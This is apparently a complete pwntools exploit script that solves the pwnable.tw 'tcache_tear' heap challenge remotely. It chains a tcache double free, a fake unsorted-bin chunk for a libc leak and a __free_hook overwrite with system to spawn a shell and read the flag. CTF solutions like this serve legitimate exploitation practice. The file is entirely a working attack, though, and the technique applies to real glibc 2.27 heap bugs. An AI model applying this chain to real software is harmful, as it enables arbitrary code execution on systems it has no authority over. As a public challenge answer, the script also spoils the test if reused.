#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_tear_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000400A50
            b* 0x0000000000400B54
            b* 0x0000000000400C4A
            b* 0x0000000000400BBF
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("chall.pwnable.tw", 10207)

def add(size, data):
    p.sendafter(b'choice :', str(1))
    p.sendafter(b'Size:', str(size))
    p.sendafter(b'Data:', data)

def free():
    p.sendafter(b'choice :', str(2))

def write():
    p.sendafter(b'choice :', str(3))

name_addr = 0x602060
p.sendafter(b'Name:', b'nhh')
add(0x90, b'a'*8)
free()
free()
add(0x90, flat(name_addr + 0x750 - 0x10))
add(0x90, b'a'*8)
payload = flat(
    0, 0x21,
    0, 0,
    0, 0x41
    )
add(0x90, payload) # 0x6027a0

add(0x80, b'b'*8)
free()
free()
add(0x80, flat(name_addr - 0x10))
add(0x80, b'b'*8)
payload = flat(
    0, 0x751,
    0, 0, 0, 0, 0,
    name_addr
    )
add(0x80, payload)
free()
write()

p.recvuntil(b'Name :')
libc_leak = u64(p.recv(6) + b'\0'*2)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x3ebca0
print("Libc base: " + hex(libc.address))

# GDB()
add(0x70, b'c'*8)
free()
free()
add(0x70, flat(libc.sym.__free_hook))
add(0x70, b'a'*8)
add(0x70, flat(libc.sym.system))
add(0x70, b'/bin/sh\0')
free()
p.sendline(b'cat /home/tcache_tear/flag')

p.interactive()